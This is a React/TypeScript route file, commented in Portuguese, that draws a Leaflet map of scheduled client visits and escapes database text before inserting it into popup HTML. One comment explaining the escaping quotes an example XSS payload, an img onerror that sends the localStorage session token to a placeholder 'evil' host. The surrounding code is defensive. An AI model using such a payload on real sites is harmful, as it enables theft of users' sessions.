import { createFileRoute, useNavigate, useLocation } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import { useQuery } from "@tanstack/react-query";
import L from "leaflet";
import "leaflet/dist/leaflet.css";
import { Locate } from "lucide-react";
import { fetchVisitas } from "@/features/visitas/data";
import { STATUS_VISITA, type VisitaStatus } from "@/features/visitas/types";
import { Button } from "@/components/ui/button";

/**
 * Escapa texto para interpolação em HTML. O Leaflet monta o popup por
 * innerHTML — não há JSX aqui para escapar por nós.
 * As cinco entidades são as que fecham atributo, tag e handler.
 */
function escapar(t: unknown): string {
  return String(t ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

export const Route = createFileRoute("/_authenticated/mapa")({
  component: MapaPage,
});

const STATUSES: VisitaStatus[] = ["pendente", "aguardando_aprovacao", "aprovado"];

function MapaPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const containerRef = useRef<HTMLDivElement>(null);
  const mapRef = useRef<L.Map | null>(null);
  const layerRef = useRef<L.LayerGroup | null>(null);
  const [active, setActive] = useState<Set<VisitaStatus>>(new Set(STATUSES));

  const { data: visitas } = useQuery({ queryKey: ["visitas"], queryFn: fetchVisitas });

  useEffect(() => {
    if (!containerRef.current || mapRef.current) return;
    const map = L.map(containerRef.current).setView([-23.5505, -46.6333], 11);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
      attribution: "© OpenStreetMap",
      maxZoom: 19,
    }).addTo(map);
    layerRef.current = L.layerGroup().addTo(map);
    mapRef.current = map;
    return () => {
      map.remove();
      mapRef.current = null;
    };
  }, []);

  const filtered = useMemo(
    () =>
      (visitas ?? []).filter(
        (v) =>
          v.latitude != null &&
          v.longitude != null &&
          active.has(v.status as VisitaStatus),
      ),
    [visitas, active],
  );

  useEffect(() => {
    const layer = layerRef.current;
    if (!layer) return;
    layer.clearLayers();
    filtered.forEach((v) => {
      const info = STATUS_VISITA[v.status as VisitaStatus];
      const icon = L.divIcon({
        className: "",
        html: `<div style="width:18px;height:18px;border-radius:50%;background:${info.pin};border:2px solid white;box-shadow:0 1px 3px rgba(0,0,0,.4)"></div>`,
        iconSize: [18, 18],
      });
      const marker = L.marker([Number(v.latitude), Number(v.longitude)], { icon });
      // XSS: `nome` e `titulo` vêm do banco e QUALQUER gestor os digita. O
      // Leaflet injeta esta string via innerHTML, então um cliente chamado
      // `<img src=x onerror=fetch('//evil/'+localStorage.token)>` executaria
      // no navegador de todo mundo que abrisse o mapa — e a sessão do Supabase
      // mora no localStorage. Escapar aqui não é zelo, é o que fecha o buraco.
      const popup = `
        <div style="font-family:var(--fonte);min-width:180px">
          <div style="font-weight:600;font-size:13px;color:#1F3864">${escapar(v.cliente?.nome ?? v.titulo)}</div>
          <div style="font-size:11px;color:#6b7280;margin-top:2px">${v.data_hora_agendada ? escapar(new Date(v.data_hora_agendada).toLocaleString("pt-BR")) : "Sem data"}</div>
          <div style="margin-top:4px;font-size:11px"><span style="background:${escapar(info.pin)};color:white;padding:1px 6px;border-radius:4px">${escapar(info.label)}</span></div>
          <a href="/visita/${encodeURIComponent(v.id)}" data-id="${escapar(v.id)}" style="margin-top:6px;display:inline-block;font-size:12px;color:#1F3864;font-weight:600">Ver detalhes →</a>
        </div>`;
      marker.bindPopup(popup);
      marker.addTo(layer);
    });
  }, [filtered]);

  // Intercept popup link clicks → use router
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      const a = t.closest?.("a[data-id]") as HTMLAnchorElement | null;
      if (a) {
        e.preventDefault();
        navigate({ to: "/visita/$id", params: { id: a.dataset.id! }, state: { from: location.pathname } as any });
      }
    };
    document.addEventListener("click", handler);
    return () => document.removeEventListener("click", handler);
  }, [navigate]);

  function locate() {
    if (!navigator.geolocation || !mapRef.current) return;
    navigator.geolocation.getCurrentPosition(
      (pos) => mapRef.current!.setView([pos.coords.latitude, pos.coords.longitude], 14),
      () => {},
    );
  }

  function toggle(s: VisitaStatus) {
    setActive((prev) => {
      const n = new Set(prev);
      if (n.has(s)) n.delete(s);
      else n.add(s);
      return n;
    });
  }

  return (
    <div className="-mx-4 -mt-4 flex h-[calc(100vh-9rem)] flex-col">
      <div className="flex gap-1 overflow-x-auto border-b bg-background px-3 py-2">
        {STATUSES.map((s) => {
          const info = STATUS_VISITA[s];
          const on = active.has(s);
          return (
            <button
              key={s}
              onClick={() => toggle(s)}
              className={`shrink-0 rounded-full border px-3 py-1 text-xs font-medium transition-opacity ${
                on ? "opacity-100" : "opacity-40"
              }`}
              style={{ borderColor: info.pin, color: info.pin }}
            >
              ● {info.label}
            </button>
          );
        })}
      </div>
      <div className="relative flex-1">
        <div ref={containerRef} className="h-full w-full" />
        <Button
          size="icon"
          variant="secondary"
          className="absolute bottom-4 right-4 z-[400] shadow-lg"
          onClick={locate}
        >
          <Locate className="h-5 w-5" />
        </Button>
      </div>
    </div>
  );
}
